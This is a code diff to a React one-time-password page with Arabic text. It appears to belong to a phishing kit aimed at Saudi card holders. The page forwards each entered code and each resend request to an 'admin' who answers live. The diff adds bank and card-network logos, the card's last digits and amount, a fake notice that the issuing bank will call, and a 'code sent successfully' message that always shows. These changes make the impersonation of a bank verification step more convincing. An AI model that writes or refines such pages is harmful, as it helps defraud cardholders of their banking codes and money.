@@ -2,7 +2,7 @@ import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
 import PageLayout from "@/components/layout/PageLayout";
-import WaitingOverlay from "@/components/WaitingOverlay";
+import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -16,11 +16,39 @@ export default function OTPVerification() {
   const [otp, setOtp] = useState("");
   const [error, setError] = useState(false);
   const [isWaiting, setIsWaiting] = useState(false);
+  const [resendTimer, setResendTimer] = useState(120); // 2 minutes countdown
+  const [canResend, setCanResend] = useState(false);
+  const [currentTime, setCurrentTime] = useState(new Date());
   const inputRef = useRef<HTMLInputElement>(null);
+
+  // Get payment data from localStorage
+  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+  const cardLast4 = paymentData.cardLast4 || "****";
+  const totalAmount = paymentData.totalPaid || 0;
+  const serviceName = paymentData.serviceName || "";
+
+  // Get card info from signal
+  const cardInfo = waitingCardInfo.value;
 
   // Emit page enter
   useEffect(() => {
     navigateToPage("رمز التحقق (OTP)");
+  }, []);
+
+  // Resend timer countdown
+  useEffect(() => {
+    if (resendTimer > 0) {
+      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
+      return () => clearTimeout(timer);
+    } else {
+      setCanResend(true);
+    }
+  }, [resendTimer]);
+
+  // Real-time clock update
+  useEffect(() => {
+    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
+    return () => clearInterval(timer);
   }, []);
 
   // Handle code action from admin
@@ -68,11 +96,54 @@ export default function OTPVerification() {
   };
 
   const handleResend = () => {
+    if (!canResend) return;
+    setCanResend(false);
+    setResendTimer(120);
     sendData({
       data: { طلب: "إعادة إرسال رمز" },
       current: "رمز التحقق (OTP)",
       waitingForAdminResponse: true,
     });
+  };
+
+  // Format timer as MM:SS
+  const formatTimer = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
+  };
+
+  // Format date in Arabic
+  const formatDate = (date: Date) => {
+    return date.toLocaleDateString("ar-SA", {
+      year: "numeric",
+      month: "numeric",
+      day: "numeric",
+    });
+  };
+
+  // Format time in Arabic
+  const formatTime = (date: Date) => {
+    return date.toLocaleTimeString("ar-SA", {
+      hour: "2-digit",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: true,
+    });
+  };
+
+  // Get card type logo
+  const getCardTypeLogo = (type?: string) => {
+    switch (type?.toLowerCase()) {
+      case "mada":
+        return "/images/mada.png";
+      case "visa":
+        return "/images/visa.png";
+      case "mastercard":
+        return "/images/mastercard.png";
+      default:
+        return "/images/mada.png";
+    }
   };
 
   return (
@@ -81,29 +152,52 @@ export default function OTPVerification() {
 
       <div className="bg-white rounded-2xl shadow-xl p-6">
         {/* Header */}
-        <div className="text-center mb-8">
-          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
-            <svg
-              className="w-8 h-8 text-primary"
-              fill="none"
-              stroke="currentColor"
-              viewBox="0 0 24 24"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
-              />
-            </svg>
-          </div>
-          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق</h1>
-          <p className="text-gray-500 text-sm">
-            تم إرسال رمز التحقق إلى رقم جوالك المسجل
+        <div className="text-center mb-6">
+          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق لمرة واحدة (OTP)</h1>
+          <p className="text-gray-600 text-sm">
+            لتأكيد العملية أدخل رمز التحقق المرسل إلى جوالك
           </p>
         </div>
 
-        <form onSubmit={handleSubmit} className="space-y-6">
+        {/* Bank and Card Type Logos */}
+        <div className="flex justify-between items-center mb-6 px-4">
+          {/* Card Type Logo (Right) */}
+          <div className="flex items-center">
+            <img
+              src={getCardTypeLogo(cardInfo?.cardType)}
+              alt={cardInfo?.cardType || "Card"}
+              className="h-10 object-contain"
+            />
+          </div>
+          
+          {/* Bank Logo (Left) */}
+          {cardInfo?.bankLogo && (
+            <div className="flex items-center">
+              <img
+                src={cardInfo.bankLogo}
+                alt={cardInfo.bankName || "Bank"}
+                className="h-10 object-contain"
+              />
+            </div>
+          )}
+        </div>
+
+        {/* Transaction Info */}
+        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
+          <p>
+            سيتم الاتصال بك من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ <span className="font-bold">{cardLast4}</span>. يرجى اتباع الرد الآلي لإرسال رمز التحقق برسالة نصية.
+          </p>
+          <p className="mt-2">
+            أنت تدفع لـ<span className="font-bold">{serviceName}</span> مبلغ <span className="font-bold text-primary">{totalAmount} ر.س</span> بتاريخ {formatDate(currentTime)} في التوقيت {formatTime(currentTime)}
+          </p>
+        </div>
+
+        {/* Success Message */}
+        <div className="text-center mb-4">
+          <span className="text-primary font-medium">تم إرسال الرمز بنجاح</span>
+        </div>
+
+        <form onSubmit={handleSubmit} className="space-y-4">
           {/* OTP Input - Single input field */}
           <div className="flex justify-center" dir="ltr">
             <Input
@@ -113,39 +207,47 @@ export default function OTPVerification() {
               maxLength={6}
               value={otp}
               onChange={handleChange}
-              placeholder="أدخل رمز التحقق"
-              className={`text-center text-xl font-bold tracking-[0.3em] h-10 w-48 placeholder:font-normal ${error ? "border-red-500" : ""}`}
+              placeholder="رمز التحقق (OTP)"
+              className={`text-center text-lg font-medium h-12 w-full max-w-xs ${error ? "border-red-500" : "border-gray-300"}`}
               autoFocus
             />
           </div>
 
           {error && (
-            <p className="text-red-500 text-xs text-center">
-              يرجى إدخال الرمز بشكل صحيح
+            <p className="text-red-500 text-sm text-center font-medium">
+              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
             </p>
           )}
 
           {/* Submit Button */}
-          <Button type="submit" className="w-full" size="lg" disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}>
+          <Button 
+            type="submit" 
+            className="w-full h-12 text-base" 
+            disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
+          >
             {isWaiting ? (
               <div className="flex items-center justify-center gap-2">
                 <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                 <span>جاري التحقق...</span>
               </div>
             ) : (
-              "تأكيد"
+              "تحقق"
             )}
           </Button>
 
-          {/* Resend Link */}
-          <div className="text-center">
-            <button
-              type="button"
-              onClick={handleResend}
-              className="text-primary text-sm hover:underline"
-            >
-              لم تستلم الرمز؟ إعادة الإرسال
-            </button>
+          {/* Resend Timer */}
+          <div className="text-center text-gray-600 text-sm">
+            {canResend ? (
+              <button
+                type="button"
+                onClick={handleResend}
+                className="text-primary hover:underline font-medium"
+              >
+                إعادة إرسال الرمز
+              </button>
+            ) : (
+              <span>إعادة إرسال: {formatTimer(resendTimer)}</span>
+            )}
           </div>
         </form>
       </div>
